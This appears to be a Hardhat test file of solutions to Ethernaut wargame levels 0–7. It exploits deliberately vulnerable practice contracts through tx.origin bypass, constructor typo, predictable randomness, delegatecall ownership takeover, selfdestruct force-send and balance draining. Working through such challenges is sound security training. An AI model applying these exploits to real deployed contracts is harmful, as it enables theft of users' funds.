const { assert, expect } = require("chai");

describe("Ethernaut", function () {
	let owner, user, hacker = null;
	const invalid           = "0x0000000000000000000000000000000000000000";
	const amount            = ethers.parseEther("0.00001");

	before(async () => {
        [owner, user, hacker] = await ethers.getSigners();
    });

	describe("Level 0 - Instance", async function () {
		it("Exploit", async function () {
			const contract = await ethers.deployContract("Instance", [ethers.encodeBytes32String("ethernaut8")]); // initial password
			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
			await contract.authenticate(passwordCurrent);
			const clearedCurrent = await contract.getCleared();
			assert.isTrue(clearedCurrent, "Failed to pass level 0."); // clear to pass the level
		});
	});

	describe("Level 1 - Fallback", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallback");
			await contract.connect(hacker).contribute({ value: amount }); // send amount less than 0.001 ether to bypass "require" in the next call
			await hacker.sendTransaction({ from: hacker, to: contract, value: amount }); // trigger the receive() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 1.");
			await contract.connect(hacker).withdraw(); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 2 - Fallout", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallout");
			await contract.connect(hacker).Fal1out({ value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 2.");
			await contract.connect(hacker).collectAllocations(); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 3 - CoinFlip", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("CoinFlip");
			const exploit = await ethers.deployContract("CoinFlipExploit");
			for (let i = 0; i < 10; i++) {
				await exploit.run(contract); // reverse engineer the algorithm to always win
			}
			const count = await contract.consecutiveWins();
			expect(count).to.equal(10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
		});
	});

	describe("Level 4 - Telephone", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Telephone");
			const exploit = await ethers.deployContract("TelephoneExploit");
			await exploit.run(contract, hacker); // use a proxy contract to bypass "tx.origin" check | this will set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 4."); // become the owner to pass the level
		});
	});

	describe("Level 5 - Token", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Token", [amount], { from: owner });
			await expect(contract.connect(owner).transfer(user, amount + BigInt("1"))).to.be.reverted; // cause an integer underflow to pass the level | solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 6 - Delegate", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Delegate", [owner]);
			await hacker.sendTransaction({ from: hacker, to: contract, data: ethers.keccak256(ethers.toUtf8Bytes("pwn()")) }) // trigger the fallback() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(hacker).to.equal(ownerCurrent, "Failed to pass level 6."); // become the owner to pass the level
		});
	});

	describe("Level 7 - Force", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Force");
			const exploit = await ethers.deployContract("ForceExploit");
			const balanceOld = await ethers.provider.getBalance(contract);
			await hacker.sendTransaction({ from: hacker, to: exploit, value: amount }); // send some balance to the exploit contract using the receive() function
			await exploit.run(contract); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function			
			const balanceNew = await ethers.provider.getBalance(contract);
			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
		});
	});
});
